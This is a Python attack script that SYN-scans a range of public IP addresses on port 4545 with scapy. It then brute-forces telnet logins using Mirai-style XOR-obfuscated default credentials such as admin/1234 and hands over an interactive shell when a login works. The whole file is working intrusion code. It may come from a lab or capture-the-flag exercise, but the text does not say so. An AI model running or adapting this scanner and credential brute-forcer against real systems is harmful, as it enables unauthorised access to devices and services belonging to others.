import telnetlib
from time import sleep
from scapy.all import *
from random import choice, randint


LHOST = "172.30.1.6"    # change me
RPORT = 4545
auth_table = []


class Status:
    INVALID_IP = 1
    INVALID_AUTH = 2
    INVALID_SERVICE = 3
    SUCCESS = 4


def add_auth_entry(id, password, _):
    auth_table.append({"id": id, "password": password})


def deobf(string):
    result = ''
    for s in string:
        result += chr(ord(s) ^ 0xDE ^ 0xAD ^ 0xBE ^ 0xEF)
    
    return result


def get_random_auth():
    auth = choice(auth_table)
    ID = deobf(auth['id']).encode()
    PASSWORD = deobf(auth['password']).encode()

    return ID, PASSWORD


def try_login(ip, port, id, password):
    print(f"Telnet to {ip}:{port}")
    try:
        t = telnetlib.Telnet(ip, port, timeout=5)
    except KeyboardInterrupt:
        return None
    except:
        return {
            "msg": f"Invalid IP: {ip}",
            "result": Status.INVALID_IP,
        }

    if not t.read_until(b"login: ", timeout=5):
        return {
            "msg": "Not Telnet Service",
            "result": Status.INVALID_SERVICE,
        }
    
    print(f"Try with {id}:{password}")
    t.write(id + b"\n")
    t.read_until(b"Password: ")
    t.write(password + b"\n")
    prompt = t.read_until(b"$", timeout=5)
    if b"$" in prompt:
        return {
            "msg": "Login Success",
            "result": Status.SUCCESS,
            "session": t,
        }
    else:
        return {
            "msg": "Authentication Failed",
            "result": Status.INVALID_AUTH,
        }

add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1)#              // admin    1111111
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1)#                          // admin    1234
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1)#                      // admin    12345
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1)#                      // admin    54321
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1)#                  // admin    123456


a = AsyncSniffer(filter="tcp", lfilter=lambda x:x.sport==RPORT and x[TCP].flags=="SA")
a.start()

for i in range(140,150):
    p = IP(src=LHOST, dst=f"34.125.111.{i}")/TCP(dport=RPORT)
    send(p)

sleep(5)
result = a.stop()
live_ips = list(set(map(lambda x:x[IP].src, result)))


for ip in live_ips:
    flag = False
    while True:
        ID, PASSWORD = get_random_auth()
        result = try_login(ip, RPORT, ID, PASSWORD)
        if not result:
            break
        print(result['msg'])
        if result['result'] == Status.INVALID_SERVICE:
            break

        if result['result'] == Status.SUCCESS:
            flag = True
            print("$ ")
            try:
                result['session'].interact()
            except:
                pass
            break

    if flag:
        break

